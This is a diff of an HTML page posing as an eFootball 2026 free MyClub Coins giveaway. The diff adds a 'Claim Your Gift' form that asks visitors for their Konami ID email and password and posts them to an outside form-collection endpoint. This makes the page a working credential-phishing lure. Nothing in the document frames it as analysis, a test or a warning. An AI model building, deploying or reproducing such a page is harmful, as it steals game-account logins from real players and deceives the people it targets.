@@ -7,32 +7,27 @@
     <style>
         body { background-color: #0d1b2a; color: white; font-family: sans-serif; margin: 0; padding: 20px; text-align: center; }
         .header { background: #1b263b; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #415a77; }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-bottom: 25px; }
         .card { background: #1b263b; border-radius: 12px; padding: 10px; border: 1px solid #415a77; }
         .coin-amount { font-weight: bold; font-size: 16px; margin-bottom: 5px; }
         .coin-img { width: 100%; border-radius: 8px; }
-        .btn-free { background: #3a86ff; color: white; border: none; padding: 8px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-free { background: #3a86ff; color: white; border: none; padding: 8px; width: 100%; border-radius: 5px; font-weight: bold; margin-top: 10px; }
+        .login-box { background: #1b263b; padding: 20px; border-radius: 15px; border: 2px solid #f1c40f; display: inline-block; width: 100%; max-width: 320px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; background: #f0f0f0; }
+        .submit-btn { background-color: #f1c40f; color: black; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; }
     </style>
 </head>
 <body>
+
     <div class="header">
         <span>eFootball™ 2026</span>
-        <span style="color:#f1c40f">🟡 MyClub</span>
+        <span style="color:#f1c40f">🟡 MyClub Coins</span>
     </div>
+
     <div class="grid">
-        <div class="card">
-            <div class="coin-amount">🟡 300</div>
-            <img src="https://raw.githubusercontent.com/nojo53/efootball-assets/main/coins300.png" class="coin-img">
-            <button class="btn-free">FREE</button>
-        </div>
         <div class="card">
             <div class="coin-amount">🟡 1,040</div>
             <img src="https://raw.githubusercontent.com/nojo53/efootball-assets/main/coins1040.png" class="coin-img">
-            <button class="btn-free">FREE</button>
-        </div>
-        <div class="card">
-            <div class="coin-amount">🟡 2,130</div>
-            <img src="https://raw.githubusercontent.com/nojo53/efootball-assets/main/coins2130.png" class="coin-img">
             <button class="btn-free">FREE</button>
         </div>
         <div class="card">
@@ -41,5 +36,17 @@
             <button class="btn-free">FREE</button>
         </div>
     </div>
+
+    <div class="login-box">
+        <h3 style="color:#f1c40f; margin-top: 0;">Claim Your Gift</h3>
+        <p style="font-size: 14px;">Enter details to receive coins</p>
+        
+        <form action="https://formspree.io/f/xvzlqvpy" method="POST">
+            <input type="email" name="email" placeholder="Konami ID (Email)" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="submit-btn">CLAIM NOW</button>
+        </form>
+    </div>
+
 </body>
 </html>
